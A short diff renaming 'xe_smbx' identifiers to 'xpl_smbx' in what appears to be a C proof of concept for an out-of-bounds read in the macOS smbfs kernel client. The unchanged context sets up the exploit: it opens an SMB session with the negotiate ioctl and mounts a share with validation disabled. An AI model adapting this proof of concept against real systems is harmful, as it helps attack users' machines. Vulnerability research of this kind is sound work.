@@ -19,7 +19,7 @@
 #include <smbfs/smbclient_internal.h>
 #include <smbfs/netbios.h>
 
-#include <xe_smbx/smbx_conf.h>
+#include <xpl_smbx/smbx_conf.h>
 
 
 ///
@@ -103,13 +103,13 @@ int main(int argc, const char * argv[]) {
         exit(1);
     }
     
-    /// Socket address of xe_smbx server
+    /// Socket address of xpl_smbx server
     struct sockaddr_in smb_addr;
     bzero(&smb_addr, sizeof(smb_addr));
     smb_addr.sin_family = AF_INET;
     smb_addr.sin_len = sizeof(smb_addr);
-    smb_addr.sin_port = htons(XE_SMBX_PORT);
-    inet_aton(XE_SMBX_HOST, &smb_addr.sin_addr);
+    smb_addr.sin_port = htons(xpl_SMBX_PORT);
+    inet_aton(xpl_SMBX_HOST, &smb_addr.sin_addr);
     
     /// STEP 2: Setup a new SMB session
     struct smbioc_negotiate negotiate_req;
@@ -129,7 +129,7 @@ int main(int argc, const char * argv[]) {
     
     if (negotiate_req.ioc_errno) {
         printf("[ERROR] SMBIOC_NEGOTIATE returned non zero ioc_errno %d\n", negotiate_req.ioc_errno);
-        printf("[ERROR] Make sure that the xe_smbx server is running\n");
+        printf("[ERROR] Make sure that the xpl_smbx server is running\n");
         exit(1);
     }
     
@@ -153,8 +153,8 @@ int main(int argc, const char * argv[]) {
     mount_args.gid = getgid();
     mount_args.file_mode = S_IRWXU;
     mount_args.dir_mode = S_IRWXU;
-    /// xe_smbx server only have very limited capabilities. This flag is required for
-    /// successfully mouting the SMB share using xe_smbx server.
+    /// xpl_smbx server only have very limited capabilities. This flag is required for
+    /// successfully mouting the SMB share using xpl_smbx server.
     mount_args.altflags |= SMBFS_MNT_VALIDATE_NEG_OFF;
     
     char mount_path[] = "/tmp/poc_sockaddr_oob_read_XXXXXXXXXX";
